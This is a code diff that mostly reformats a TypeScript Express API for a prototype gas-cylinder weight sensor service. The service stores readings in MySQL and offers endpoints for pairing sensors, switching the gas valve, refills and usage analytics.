@@ -12,10 +12,14 @@ dotenv.config();
 
 const app = express();
 const port = Number(process.env.API_PORT || 4000);
-const webDir = path.basename(process.cwd()) === "api" ? path.resolve(process.cwd(), "../../web") : path.resolve(process.cwd(), "web");
+const webDir =
+  path.basename(process.cwd()) === "api"
+    ? path.resolve(process.cwd(), "../../web")
+    : path.resolve(process.cwd(), "web");
 const estimatedUsageKgPerHour = 0.35;
 const estimatedUsageHoursPerDay = 2;
-const estimatedDailyUsageKg = estimatedUsageKgPerHour * estimatedUsageHoursPerDay;
+const estimatedDailyUsageKg =
+  estimatedUsageKgPerHour * estimatedUsageHoursPerDay;
 
 const pool = mysql.createPool({
   host: process.env.MYSQL_HOST || "localhost",
@@ -29,16 +33,33 @@ const pool = mysql.createPool({
 });
 
 type Sensor = {
-  sensorId: string; name: string; signalStrength: number; status: "READY_TO_PAIR" | "PAIRED";
-  gasValveState: "UNKNOWN" | "OPEN" | "CLOSED"; powerState: "ON" | "OFF";
-  tareWeightKg: number; gasCapacityKg: number; gasWeightKg: number; dayStartGasWeightKg: number;
-  gasStatus: "GOOD" | "LOW" | "EMPTY"; serialNumber: string; firmwareVersion: string;
-  gasType: string; provider: string; calibrationDate: string; nextCalibrationDate: string;
-  lastUpdatedAt: string; pairedAt: string | null;
+  sensorId: string;
+  name: string;
+  signalStrength: number;
+  status: "READY_TO_PAIR" | "PAIRED";
+  gasValveState: "UNKNOWN" | "OPEN" | "CLOSED";
+  powerState: "ON" | "OFF";
+  tareWeightKg: number;
+  gasCapacityKg: number;
+  gasWeightKg: number;
+  dayStartGasWeightKg: number;
+  gasStatus: "GOOD" | "LOW" | "EMPTY";
+  serialNumber: string;
+  firmwareVersion: string;
+  gasType: string;
+  provider: string;
+  calibrationDate: string;
+  nextCalibrationDate: string;
+  lastUpdatedAt: string;
+  pairedAt: string | null;
 };
 
-const error = (s: Response, status: number, code: string, message: string) => s.status(status).json({ error: { code, message } });
-const asyncH = (fn: (r: Request, s: Response, n: NextFunction) => Promise<unknown>) => (r: Request, s: Response, n: NextFunction) => void fn(r, s, n).catch(n);
+const error = (s: Response, status: number, code: string, message: string) =>
+  s.status(status).json({ error: { code, message } });
+const asyncH =
+  (fn: (r: Request, s: Response, n: NextFunction) => Promise<unknown>) =>
+  (r: Request, s: Response, n: NextFunction) =>
+    void fn(r, s, n).catch(n);
 
 async function initDb() {
   await pool.execute(`CREATE TABLE IF NOT EXISTS sensors (
@@ -58,22 +79,39 @@ async function initDb() {
     INDEX idx_sensor_time (sensor_id, captured_at), CONSTRAINT fk_reading_sensor FOREIGN KEY (sensor_id) REFERENCES sensors(sensor_id) ON DELETE CASCADE
   )`);
   try {
-    await pool.execute("ALTER TABLE sensors ADD COLUMN gas_status ENUM('GOOD','LOW','EMPTY') NOT NULL DEFAULT 'GOOD'");
+    await pool.execute(
+      "ALTER TABLE sensors ADD COLUMN gas_status ENUM('GOOD','LOW','EMPTY') NOT NULL DEFAULT 'GOOD'",
+    );
   } catch (e: any) {
     if (e?.code !== "ER_DUP_FIELDNAME") throw e;
   }
 }
 
-function addMonths(value: Date, months: number) { const d = new Date(value); d.setMonth(d.getMonth() + months); return d; }
-function formatHour(hour: number) { return `${hour % 12 || 12}:00 ${hour >= 12 ? "PM" : "AM"}`; }
-function formatPeak(hours: number[]) { return hours.length ? `Dinner preparation peaks at ${formatHour(Math.min(...hours))} – ${formatHour(Math.min(23, Math.max(...hours) + 1))}.` : "Not enough data yet."; }
+function addMonths(value: Date, months: number) {
+  const d = new Date(value);
+  d.setMonth(d.getMonth() + months);
+  return d;
+}
+function formatHour(hour: number) {
+  return `${hour % 12 || 12}:00 ${hour >= 12 ? "PM" : "AM"}`;
+}
+function formatPeak(hours: number[]) {
+  return hours.length
+    ? `Dinner preparation peaks at ${formatHour(Math.min(...hours))} – ${formatHour(Math.min(23, Math.max(...hours) + 1))}.`
+    : "Not enough data yet.";
+}
 
 type AnalyticsPeriod = "daily" | "weekly" | "monthly";
 type AnalyticsBucket = { label: string; usageKg: number };
 
-function roundKg(value: number) { return Number(value.toFixed(2)); }
+function roundKg(value: number) {
+  return Number(value.toFixed(2));
+}
 
-function analyticsBuckets(period: AnalyticsPeriod, now = new Date()): AnalyticsBucket[] {
+function analyticsBuckets(
+  period: AnalyticsPeriod,
+  now = new Date(),
+): AnalyticsBucket[] {
   if (period === "daily") {
     return Array.from({ length: 6 }, (_, index) => {
       const hour = index * 4;
@@ -89,15 +127,26 @@ function analyticsBuckets(period: AnalyticsPeriod, now = new Date()): AnalyticsB
     return Array.from({ length: 5 }, (_, index) => {
       const date = new Date(start);
       date.setDate(start.getDate() + index);
-      return { label: date.toLocaleDateString("en-US", { weekday: "short" }), usageKg: 0 };
+      return {
+        label: date.toLocaleDateString("en-US", { weekday: "short" }),
+        usageKg: 0,
+      };
     });
   }
 
-  return Array.from({ length: 4 }, (_, index) => ({ label: `Week ${index + 1}`, usageKg: 0 }));
+  return Array.from({ length: 4 }, (_, index) => ({
+    label: `Week ${index + 1}`,
+    usageKg: 0,
+  }));
 }
 
-function bucketIndex(period: AnalyticsPeriod, capturedAt: Date, now = new Date()) {
-  if (period === "daily") return Math.min(5, Math.floor(capturedAt.getHours() / 4));
+function bucketIndex(
+  period: AnalyticsPeriod,
+  capturedAt: Date,
+  now = new Date(),
+) {
+  if (period === "daily")
+    return Math.min(5, Math.floor(capturedAt.getHours() / 4));
   const start = new Date(now);
   start.setHours(0, 0, 0, 0);
   if (period === "weekly") {
@@ -107,10 +156,13 @@ function bucketIndex(period: AnalyticsPeriod, capturedAt: Date, now = new Date()
     start.setDate(1);
   }
   const days = Math.floor((capturedAt.getTime() - start.getTime()) / 86400000);
-  if (days < 0 || (period === "weekly" && days >= 5) || (period === "monthly" && days >= 28)) return null;
-  return period === "weekly"
-    ? days
-    : Math.floor(days / 7);
+  if (
+    days < 0 ||
+    (period === "weekly" && days >= 5) ||
+    (period === "monthly" && days >= 28)
+  )
+    return null;
+  return period === "weekly" ? days : Math.floor(days / 7);
 }
 
 async function buildAnalytics(sensor: Sensor, period: AnalyticsPeriod) {
@@ -120,23 +172,38 @@ async function buildAnalytics(sensor: Sensor, period: AnalyticsPeriod) {
     "SELECT gas_remaining_grams,captured_at FROM sensor_readings WHERE sensor_id=? AND quality='VALID' AND captured_at>=DATE_SUB(NOW(), INTERVAL ? DAY) ORDER BY captured_at ASC",
     [sensor.sensorId, days],
   );
-  const readings = rows as Array<{ gas_remaining_grams: number; captured_at: string | Date }>;
+  const readings = rows as Array<{
+    gas_remaining_grams: number;
+    captured_at: string | Date;
+  }>;
   const buckets = analyticsBuckets(period, now);
   let totalGrams = 0;
 
   for (let index = 1; index < readings.length; index += 1) {
-    const usedGrams = Math.max(0, Number(readings[index - 1].gas_remaining_grams) - Number(readings[index].gas_remaining_grams));
+    const usedGrams = Math.max(
+      0,
+      Number(readings[index - 1].gas_remaining_grams) -
+        Number(readings[index].gas_remaining_grams),
+    );
     if (!usedGrams) continue;
     totalGrams += usedGrams;
-    const bucket = bucketIndex(period, new Date(readings[index].captured_at), now);
+    const bucket = bucketIndex(
+      period,
+      new Date(readings[index].captured_at),
+      now,
+    );
     if (bucket !== null) buckets[bucket].usageKg += usedGrams / 1000;
   }
 
   const totalKg = roundKg(totalGrams / 1000);
   const periodDays = period === "daily" ? 1 : period === "weekly" ? 5 : 28;
-  const averageDailyKg = totalKg > 0 ? totalKg / periodDays : estimatedDailyUsageKg;
+  const averageDailyKg =
+    totalKg > 0 ? totalKg / periodDays : estimatedDailyUsageKg;
   const peakCookingHours = buckets
-    .map((bucket, index) => ({ usageKg: bucket.usageKg, hour: period === "daily" ? index * 4 : null }))
+    .map((bucket, index) => ({
+      usageKg: bucket.usageKg,
+      hour: period === "daily" ? index * 4 : null,
+    }))
     .filter((bucket) => bucket.hour !== null && bucket.usageKg > 0)
     .sort((left, right) => right.usageKg - left.usageKg)
     .slice(0, 2)
@@ -148,7 +215,10 @@ async function buildAnalytics(sensor: Sensor, period: AnalyticsPeriod) {
     sensorId: sensor.sensorId,
     period,
     totalKg,
-    buckets: buckets.map((bucket) => ({ ...bucket, usageKg: roundKg(bucket.usageKg) })),
+    buckets: buckets.map((bucket) => ({
+      ...bucket,
+      usageKg: roundKg(bucket.usageKg),
+    })),
     insights: {
       cylinderDurationDays: Math.ceil(sensor.gasWeightKg / averageDailyKg),
       comparisonPercent,
@@ -173,7 +243,9 @@ async function buildAnalytics(sensor: Sensor, period: AnalyticsPeriod) {
 }
 
 async function getSensor(sensorId: string): Promise<Sensor | null> {
-  const [rows] = await pool.query("SELECT * FROM sensors WHERE sensor_id = ?", [sensorId]);
+  const [rows] = await pool.query("SELECT * FROM sensors WHERE sensor_id = ?", [
+    sensorId,
+  ]);
   const row = (rows as any[])[0];
   if (!row) return null;
   const sensor: Sensor = {
@@ -187,7 +259,12 @@ async function getSensor(sensorId: string): Promise<Sensor | null> {
     gasCapacityKg: Number(row.gas_capacity_kg),
     gasWeightKg: Number(row.gas_weight_kg),
     dayStartGasWeightKg: Number(row.day_start_gas_weight_kg),
-    gasStatus: row.gas_weight_kg <= 0 ? "EMPTY" : Number(row.gas_weight_kg) / Number(row.gas_capacity_kg) <= 0.2 ? "LOW" : "GOOD",
+    gasStatus:
+      row.gas_weight_kg <= 0
+        ? "EMPTY"
+        : Number(row.gas_weight_kg) / Number(row.gas_capacity_kg) <= 0.2
+          ? "LOW"
+          : "GOOD",
     serialNumber: row.serial_number,
     firmwareVersion: row.firmware_version,
     gasType: row.gas_type,
@@ -199,129 +276,450 @@ async function getSensor(sensorId: string): Promise<Sensor | null> {
   };
   const now = Date.now();
   const last = new Date(sensor.lastUpdatedAt).getTime();
-  if (sensor.powerState === "ON" && sensor.gasValveState === "OPEN" && sensor.gasWeightKg > 0) {
+  if (
+    sensor.powerState === "ON" &&
+    sensor.gasValveState === "OPEN" &&
+    sensor.gasWeightKg > 0
+  ) {
     const minutes = Math.max(0, now - last) / 60000;
     sensor.gasWeightKg = Math.max(0, sensor.gasWeightKg - minutes * 0.02);
   }
   sensor.lastUpdatedAt = new Date(now).toISOString();
-  const percent = sensor.gasCapacityKg ? sensor.gasWeightKg / sensor.gasCapacityKg : 0;
+  const percent = sensor.gasCapacityKg
+    ? sensor.gasWeightKg / sensor.gasCapacityKg
+    : 0;
   sensor.gasStatus = percent <= 0 ? "EMPTY" : percent <= 0.2 ? "LOW" : "GOOD";
-  await pool.execute("UPDATE sensors SET gas_weight_kg=?, gas_status=?, last_updated_at=? WHERE sensor_id=?", [sensor.gasWeightKg, sensor.gasStatus, sensor.lastUpdatedAt, sensorId]).catch(() => undefined);
-  await pool.execute("INSERT INTO sensor_readings (sensor_id,gross_weight_grams,gas_remaining_grams,captured_at) VALUES (?,?,?,?)", [sensorId, Math.round((sensor.tareWeightKg + sensor.gasWeightKg) * 1000), Math.round(sensor.gasWeightKg * 1000), sensor.lastUpdatedAt]).catch(() => undefined);
+  await pool
+    .execute(
+      "UPDATE sensors SET gas_weight_kg=?, gas_status=?, last_updated_at=? WHERE sensor_id=?",
+      [sensor.gasWeightKg, sensor.gasStatus, sensor.lastUpdatedAt, sensorId],
+    )
+    .catch(() => undefined);
+  await pool
+    .execute(
+      "INSERT INTO sensor_readings (sensor_id,gross_weight_grams,gas_remaining_grams,captured_at) VALUES (?,?,?,?)",
+      [
+        sensorId,
+        Math.round((sensor.tareWeightKg + sensor.gasWeightKg) * 1000),
+        Math.round(sensor.gasWeightKg * 1000),
+        sensor.lastUpdatedAt,
+      ],
+    )
+    .catch(() => undefined);
   return sensor;
 }
 
 function overview(sensor: Sensor) {
-  const percent = sensor.gasCapacityKg ? Math.max(0, Math.min(100, sensor.gasWeightKg / sensor.gasCapacityKg * 100)) : 0;
-  return { sensorId: sensor.sensorId, name: sensor.name, status: sensor.status, powerState: sensor.powerState, gasValveState: sensor.gasValveState, tareWeightGrams: Math.round(sensor.tareWeightKg * 1000), grossWeightGrams: Math.round((sensor.tareWeightKg + sensor.gasWeightKg) * 1000), gasCapacityGrams: Math.round(sensor.gasCapacityKg * 1000), gasRemainingGrams: Math.round(sensor.gasWeightKg * 1000), gasRemainingPercent: Math.round(percent), gasStatus: sensor.gasStatus, gasType: sensor.gasType, provider: sensor.provider, estimatedUsageKgPerHour, estimatedUsageHoursPerDay, estimatedDailyUsageKg, estimatedDaysLeft: Math.ceil(sensor.gasWeightKg / estimatedDailyUsageKg), todaysUseKg: Math.max(0, Number((sensor.dayStartGasWeightKg - sensor.gasWeightKg).toFixed(2))), alertLimitPercent: 20, alertChannel: "SMS", batteryLevel: sensor.powerState === "ON" ? 98 : 0, signalStrength: sensor.powerState === "ON" ? sensor.signalStrength : 0, readingQuality: "VALID", stable: true, lastSeenAt: sensor.lastUpdatedAt, pairedAt: sensor.pairedAt };
+  const percent = sensor.gasCapacityKg
+    ? Math.max(
+        0,
+        Math.min(100, (sensor.gasWeightKg / sensor.gasCapacityKg) * 100),
+      )
+    : 0;
+  return {
+    sensorId: sensor.sensorId,
+    name: sensor.name,
+    status: sensor.status,
+    powerState: sensor.powerState,
+    gasValveState: sensor.gasValveState,
+    tareWeightGrams: Math.round(sensor.tareWeightKg * 1000),
+    grossWeightGrams: Math.round(
+      (sensor.tareWeightKg + sensor.gasWeightKg) * 1000,
+    ),
+    gasCapacityGrams: Math.round(sensor.gasCapacityKg * 1000),
+    gasRemainingGrams: Math.round(sensor.gasWeightKg * 1000),
+    gasRemainingPercent: Math.round(percent),
+    gasStatus: sensor.gasStatus,
+    gasType: sensor.gasType,
+    provider: sensor.provider,
+    estimatedUsageKgPerHour,
+    estimatedUsageHoursPerDay,
+    estimatedDailyUsageKg,
+    estimatedDaysLeft: Math.ceil(sensor.gasWeightKg / estimatedDailyUsageKg),
+    todaysUseKg: Math.max(
+      0,
+      Number((sensor.dayStartGasWeightKg - sensor.gasWeightKg).toFixed(2)),
+    ),
+    alertLimitPercent: 20,
+    alertChannel: "SMS",
+    batteryLevel: sensor.powerState === "ON" ? 98 : 0,
+    signalStrength: sensor.powerState === "ON" ? sensor.signalStrength : 0,
+    readingQuality: "VALID",
+    stable: true,
+    lastSeenAt: sensor.lastUpdatedAt,
+    pairedAt: sensor.pairedAt,
+  };
 }
 
-async function listSensors() { const [rows] = await pool.query("SELECT * FROM sensors ORDER BY created_at DESC"); return Promise.all((rows as any[]).map(async (row) => { const sensor = await getSensor(row.sensor_id); return sensor ? overview(sensor) : null; })).then((items) => items.filter(Boolean)); }
+async function listSensors() {
+  const [rows] = await pool.query(
+    "SELECT * FROM sensors ORDER BY created_at DESC",
+  );
+  return Promise.all(
+    (rows as any[]).map(async (row) => {
+      const sensor = await getSensor(row.sensor_id);
+      return sensor ? overview(sensor) : null;
+    }),
+  ).then((items) => items.filter(Boolean));
+}
 
 app.use(helmet());
-app.use(cors({
-  origin: true,
-  methods: ["GET", "POST", "PATCH", "DELETE", "OPTIONS"],
-  allowedHeaders: ["Content-Type", "Authorization"],
-}));
+app.use(
+  cors({
+    origin: true,
+    methods: ["GET", "POST", "PATCH", "DELETE", "OPTIONS"],
+    allowedHeaders: ["Content-Type", "Authorization"],
+  }),
+);
 app.use(express.json({ limit: "32kb" }));
-app.get("/health", async (_r, s) => { try { await pool.query("SELECT 1"); s.json({ ok: true }); } catch { error(s, 503, "DATABASE_UNAVAILABLE", "MySQL is unavailable"); } });
-
-app.get("/api/v1/prototype/sensors", asyncH(async (_r, s) => s.json({ source: "mysql", scannedAt: new Date().toISOString(), sensors: await listSensors() })));
-app.get("/api/v1/prototype/admin/sensors", asyncH(async (_r, s) => { const sensors = await listSensors(); s.json({ sensors, total: sensors.length }); }));
-app.get("/api/v1/sensors", asyncH(async (_r, s) => s.json({ sensors: await listSensors() })));
-app.get("/api/v1/admin/sensors", asyncH(async (_r, s) => s.json({ sensors: await listSensors() })));
-
-app.post("/api/v1/prototype/admin/sensors", asyncH(async (r, s) => {
-  const p = z.object({ sensorId: z.string().min(4).max(80).optional(), name: z.string().min(1).max(120), tareWeightKg: z.number().min(0).max(1000).default(6), gasCapacityKg: z.number().positive().max(1000).default(6), gasWeightKg: z.number().min(0).max(1000).optional(), gasType: z.string().min(1).max(120).optional(), provider: z.string().min(1).max(120).optional() }).parse(r.body);
-  const sensorId = p.sensorId || `GS-V2.1-${crypto.randomBytes(2).toString("hex").toUpperCase()}`;
-  const existing = await getSensor(sensorId);
-  if (existing) {
-    const nextCapacity = p.gasCapacityKg;
-    const nextWeight = Math.min(p.gasWeightKg ?? existing.gasWeightKg, nextCapacity);
-    await pool.execute("UPDATE sensors SET name=?,tare_weight_kg=?,gas_capacity_kg=?,gas_weight_kg=?,day_start_gas_weight_kg=?,gas_type=COALESCE(?,gas_type),provider=COALESCE(?,provider),last_updated_at=? WHERE sensor_id=?", [p.name, p.tareWeightKg, nextCapacity, nextWeight, nextWeight, p.gasType ?? null, p.provider ?? null, new Date(), sensorId]);
-    const updated = await getSensor(sensorId);
-    return s.json({ success: true, updated: true, sensor: updated && overview(updated) });
+app.get("/health", async (_r, s) => {
+  try {
+    await pool.query("SELECT 1");
+    s.json({ ok: true });
+  } catch {
+    error(s, 503, "DATABASE_UNAVAILABLE", "MySQL is unavailable");
   }
-  const now = new Date(); const serial = `${sensorId.replace("GS-V2.1-", "")}-0001`;
-  await pool.execute("INSERT INTO sensors (sensor_id,name,signal_strength,status,gas_valve_state,power_state,tare_weight_kg,gas_capacity_kg,gas_weight_kg,day_start_gas_weight_kg,gas_type,provider,serial_number,calibration_date,next_calibration_date,last_updated_at) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", [sensorId, p.name, -52, "READY_TO_PAIR", "CLOSED", "ON", p.tareWeightKg, p.gasCapacityKg, p.gasWeightKg ?? p.gasCapacityKg, p.gasWeightKg ?? p.gasCapacityKg, p.gasType ?? "LPG (Propane/Butane)", p.provider ?? "Gas Nigeria Ltd.", serial, now, addMonths(now, 6), now]);
-  const sensor = await getSensor(sensorId); s.status(201).json({ success: true, sensor: sensor && overview(sensor) });
-}));
+});
 
-async function pair(r: Request, s: Response) { const id = String(r.params.sensorId); const sensor = await getSensor(id); if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found"); await pool.execute("UPDATE sensors SET status='PAIRED', paired_at=? WHERE sensor_id=?", [new Date(), id]); s.json({ success: true, sensorId: id, status: "PAIRED" }); }
-app.post("/api/v1/prototype/sensors/:sensorId/pair", asyncH(pair)); app.post("/api/v1/prototype/admin/sensors/:sensorId/pair", asyncH(pair));
+app.get(
+  "/api/v1/prototype/sensors",
+  asyncH(async (_r, s) =>
+    s.json({
+      source: "mysql",
+      scannedAt: new Date().toISOString(),
+      sensors: await listSensors(),
+    }),
+  ),
+);
+app.get(
+  "/api/v1/prototype/admin/sensors",
+  asyncH(async (_r, s) => {
+    const sensors = await listSensors();
+    s.json({ sensors, total: sensors.length });
+  }),
+);
+app.get(
+  "/api/v1/sensors",
+  asyncH(async (_r, s) => s.json({ sensors: await listSensors() })),
+);
+app.get(
+  "/api/v1/admin/sensors",
+  asyncH(async (_r, s) => s.json({ sensors: await listSensors() })),
+);
 
-async function power(r: Request, s: Response) { const id = String(r.params.sensorId); const p = z.object({ state: z.enum(["ON", "OFF"]), confirmed: z.literal(true) }).parse(r.body); const sensor = await getSensor(id); if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found"); await pool.execute("UPDATE sensors SET power_state=?, gas_valve_state=? WHERE sensor_id=?", [p.state, p.state === "ON" ? "OPEN" : "CLOSED", id]); s.status(202).json({ success: true, sensorId: id, powerState: p.state, gasValveState: p.state === "ON" ? "OPEN" : "CLOSED" }); }
+app.post(
+  "/api/v1/prototype/admin/sensors",
+  asyncH(async (r, s) => {
+    const p = z
+      .object({
+        sensorId: z.string().min(4).max(80).optional(),
+        name: z.string().min(1).max(120),
+        tareWeightKg: z.number().min(0).max(1000).default(6),
+        gasCapacityKg: z.number().positive().max(1000).default(6),
+        gasWeightKg: z.number().min(0).max(1000).optional(),
+        gasType: z.string().min(1).max(120).optional(),
+        provider: z.string().min(1).max(120).optional(),
+      })
+      .parse(r.body);
+    const sensorId =
+      p.sensorId ||
+      `GS-V2.1-${crypto.randomBytes(2).toString("hex").toUpperCase()}`;
+    const existing = await getSensor(sensorId);
+    if (existing) {
+      const nextCapacity = p.gasCapacityKg;
+      const nextWeight = Math.min(
+        p.gasWeightKg ?? existing.gasWeightKg,
+        nextCapacity,
+      );
+      await pool.execute(
+        "UPDATE sensors SET name=?,tare_weight_kg=?,gas_capacity_kg=?,gas_weight_kg=?,day_start_gas_weight_kg=?,gas_type=COALESCE(?,gas_type),provider=COALESCE(?,provider),last_updated_at=? WHERE sensor_id=?",
+        [
+          p.name,
+          p.tareWeightKg,
+          nextCapacity,
+          nextWeight,
+          nextWeight,
+          p.gasType ?? null,
+          p.provider ?? null,
+          new Date(),
+          sensorId,
+        ],
+      );
+      const updated = await getSensor(sensorId);
+      return s.json({
+        success: true,
+        updated: true,
+        sensor: updated && overview(updated),
+      });
+    }
+    const now = new Date();
+    const serial = `${sensorId.replace("GS-V2.1-", "")}-0001`;
+    await pool.execute(
+      "INSERT INTO sensors (sensor_id,name,signal_strength,status,gas_valve_state,power_state,tare_weight_kg,gas_capacity_kg,gas_weight_kg,day_start_gas_weight_kg,gas_type,provider,serial_number,calibration_date,next_calibration_date,last_updated_at) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
+      [
+        sensorId,
+        p.name,
+        -52,
+        "READY_TO_PAIR",
+        "CLOSED",
+        "ON",
+        p.tareWeightKg,
+        p.gasCapacityKg,
+        p.gasWeightKg ?? p.gasCapacityKg,
+        p.gasWeightKg ?? p.gasCapacityKg,
+        p.gasType ?? "LPG (Propane/Butane)",
+        p.provider ?? "Gas Nigeria Ltd.",
+        serial,
+        now,
+        addMonths(now, 6),
+        now,
+      ],
+    );
+    const sensor = await getSensor(sensorId);
+    s.status(201).json({ success: true, sensor: sensor && overview(sensor) });
+  }),
+);
+
+async function pair(r: Request, s: Response) {
+  const id = String(r.params.sensorId);
+  const sensor = await getSensor(id);
+  if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+  await pool.execute(
+    "UPDATE sensors SET status='PAIRED', paired_at=? WHERE sensor_id=?",
+    [new Date(), id],
+  );
+  s.json({ success: true, sensorId: id, status: "PAIRED" });
+}
+app.post("/api/v1/prototype/sensors/:sensorId/pair", asyncH(pair));
+app.post("/api/v1/prototype/admin/sensors/:sensorId/pair", asyncH(pair));
+
+async function power(r: Request, s: Response) {
+  const id = String(r.params.sensorId);
+  const p = z
+    .object({ state: z.enum(["ON", "OFF"]), confirmed: z.literal(true) })
+    .parse(r.body);
+  const sensor = await getSensor(id);
+  if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+  await pool.execute(
+    "UPDATE sensors SET power_state=?, gas_valve_state=? WHERE sensor_id=?",
+    [p.state, p.state === "ON" ? "OPEN" : "CLOSED", id],
+  );
+  s.status(202).json({
+    success: true,
+    sensorId: id,
+    powerState: p.state,
+    gasValveState: p.state === "ON" ? "OPEN" : "CLOSED",
+  });
+}
 app.post("/api/v1/prototype/admin/sensors/:sensorId/power", asyncH(power));
 
-app.patch("/api/v1/prototype/admin/sensors/:sensorId", asyncH(async (r, s) => {
+app.patch(
+  "/api/v1/prototype/admin/sensors/:sensorId",
+  asyncH(async (r, s) => {
+    const id = String(r.params.sensorId);
+    const sensor = await getSensor(id);
+    if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+    const p = z
+      .object({
+        name: z.string().min(1).max(120).optional(),
+        tareWeightKg: z.number().min(0).max(1000).optional(),
+        gasCapacityKg: z.number().positive().max(1000).optional(),
+        gasWeightKg: z.number().min(0).max(1000).optional(),
+        gasType: z.string().min(1).max(120).optional(),
+        provider: z.string().min(1).max(120).optional(),
+      })
+      .parse(r.body);
+    const nextCapacity = p.gasCapacityKg ?? sensor.gasCapacityKg;
+    const nextWeight = Math.min(
+      p.gasWeightKg ?? sensor.gasWeightKg,
+      nextCapacity,
+    );
+    await pool.execute(
+      "UPDATE sensors SET name=COALESCE(?,name),tare_weight_kg=COALESCE(?,tare_weight_kg),gas_capacity_kg=?,gas_weight_kg=?,gas_type=COALESCE(?,gas_type),provider=COALESCE(?,provider),last_updated_at=? WHERE sensor_id=?",
+      [
+        p.name ?? null,
+        p.tareWeightKg ?? null,
+        nextCapacity,
+        nextWeight,
+        p.gasType ?? null,
+        p.provider ?? null,
+        new Date(),
+        id,
+      ],
+    );
+    const updated = await getSensor(id);
+    s.json({ success: true, sensor: updated && overview(updated) });
+  }),
+);
+
+app.post(
+  "/api/v1/prototype/admin/sensors/:sensorId/refill",
+  asyncH(async (r, s) => {
+    const id = String(r.params.sensorId);
+    const sensor = await getSensor(id);
+    if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+    const p = z
+      .object({ gasWeightKg: z.number().min(0).max(1000).optional() })
+      .parse(r.body || {});
+    const weight = Math.min(
+      p.gasWeightKg ?? sensor.gasCapacityKg,
+      sensor.gasCapacityKg,
+    );
+    await pool.execute(
+      "UPDATE sensors SET gas_weight_kg=?,day_start_gas_weight_kg=?,gas_valve_state='CLOSED',last_updated_at=? WHERE sensor_id=?",
+      [weight, weight, new Date(), id],
+    );
+    const updated = await getSensor(id);
+    s.json({
+      success: true,
+      action: "REFILL",
+      sensor: updated && overview(updated),
+    });
+  }),
+);
+
+app.get(
+  "/api/v1/prototype/sensors/:sensorId/overview",
+  asyncH(async (r, s) => {
+    const sensor = await getSensor(String(r.params.sensorId));
+    if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+    if (sensor.status !== "PAIRED")
+      return error(
+        s,
+        409,
+        "SENSOR_NOT_PAIRED",
+        "Pair the sensor before requesting its overview",
+      );
+    s.json(overview(sensor));
+  }),
+);
+app.get(
+  "/api/v1/sensors/:sensorId/overview",
+  asyncH(async (r, s) => {
+    const sensor = await getSensor(String(r.params.sensorId));
+    if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
+    s.json(overview(sensor));
+  }),
+);
+
+async function gasControl(r: Request, s: Response) {
   const id = String(r.params.sensorId);
+  const p = z
+    .object({ state: z.enum(["ON", "OFF"]), confirmed: z.literal(true) })
+    .parse(r.body);
   const sensor = await getSensor(id);
   if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
-  const p = z.object({
-    name: z.string().min(1).max(120).optional(),
-    tareWeightKg: z.number().min(0).max(1000).optional(),
-    gasCapacityKg: z.number().positive().max(1000).optional(),
-    gasWeightKg: z.number().min(0).max(1000).optional(),
-    gasType: z.string().min(1).max(120).optional(),
-    provider: z.string().min(1).max(120).optional(),
-  }).parse(r.body);
-  const nextCapacity = p.gasCapacityKg ?? sensor.gasCapacityKg;
-  const nextWeight = Math.min(p.gasWeightKg ?? sensor.gasWeightKg, nextCapacity);
-  await pool.execute("UPDATE sensors SET name=COALESCE(?,name),tare_weight_kg=COALESCE(?,tare_weight_kg),gas_capacity_kg=?,gas_weight_kg=?,gas_type=COALESCE(?,gas_type),provider=COALESCE(?,provider),last_updated_at=? WHERE sensor_id=?", [p.name ?? null, p.tareWeightKg ?? null, nextCapacity, nextWeight, p.gasType ?? null, p.provider ?? null, new Date(), id]);
-  const updated = await getSensor(id);
-  s.json({ success: true, sensor: updated && overview(updated) });
-}));
+  await pool.execute("UPDATE sensors SET gas_valve_state=? WHERE sensor_id=?", [
+    p.state === "ON" ? "OPEN" : "CLOSED",
+    id,
+  ]);
+  s.status(202).json({
+    accepted: true,
+    sensorId: id,
+    command: p.state === "ON" ? "gas_on" : "gas_off",
+    gasValveState: p.state === "ON" ? "OPEN" : "CLOSED",
+  });
+}
+app.post("/api/v1/prototype/sensors/:sensorId/gas-control", asyncH(gasControl));
+app.post("/api/v1/sensors/:sensorId/gas-control", asyncH(gasControl));
 
-app.post("/api/v1/prototype/admin/sensors/:sensorId/refill", asyncH(async (r, s) => {
-  const id = String(r.params.sensorId);
-  const sensor = await getSensor(id);
-  if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found");
-  const p = z.object({ gasWeightKg: z.number().min(0).max(1000).optional() }).parse(r.body || {});
-  const weight = Math.min(p.gasWeightKg ?? sensor.gasCapacityKg, sensor.gasCapacityKg);
-  await pool.execute("UPDATE sensors SET gas_weight_kg=?,day_start_gas_weight_kg=?,gas_valve_state='CLOSED',last_updated_at=? WHERE sensor_id=?", [weight, weight, new Date(), id]);
-  const updated = await getSensor(id);
-  s.json({ success: true, action: "REFILL", sensor: updated && overview(updated) });
-}));
-
-app.get("/api/v1/prototype/sensors/:sensorId/overview", asyncH(async (r, s) => { const sensor = await getSensor(String(r.params.sensorId)); if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found"); if (sensor.status !== "PAIRED") return error(s, 409, "SENSOR_NOT_PAIRED", "Pair the sensor before requesting its overview"); s.json(overview(sensor)); }));
-app.get("/api/v1/sensors/:sensorId/overview", asyncH(async (r, s) => { const sensor = await getSensor(String(r.params.sensorId)); if (!sensor) return error(s, 404, "SENSOR_NOT_FOUND", "Sensor not found"); s.json(overview(sensor)); }));
-
